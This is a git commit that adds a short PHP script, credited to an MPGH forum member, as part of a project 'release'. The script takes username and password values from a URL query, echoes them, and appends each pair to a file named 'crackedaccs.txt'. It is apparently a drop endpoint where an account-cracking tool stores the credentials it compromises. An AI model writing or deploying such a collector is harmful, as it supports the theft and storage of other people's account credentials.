3983a2d91392cbf55456c5c95e4ab07db3d45258
Manevolent <teamlixo@gmail.com>
2014-12-04 09:58:36 -0500

    More work on releases.

---
+++ release/php/writefile.php
@@ -0,0 +1,16 @@
+<?php
+//By Ex0rPl4net (incorporated 12/4/2014)
+//MPGH: http://www.mpgh.net/forum/member.php?u=1966281
+//	http://www.mpgh.net/forum/showthread.php?t=782607
+
+//the link is (your domain)/writefile.php?user=$user&password=$pass
+$theuser = $_GET["user"];
+$thepassword = $_GET["password"];
+$full = $theuser . ':' . $thepassword;
+echo htmlentities($full); //Potential XSS
+$file = 'crackedaccs.txt';
+$current = file_get_contents($file);
+$current .= "$full \n";
+
+file_put_contents($file, $current, LOCK_EX);
+?>
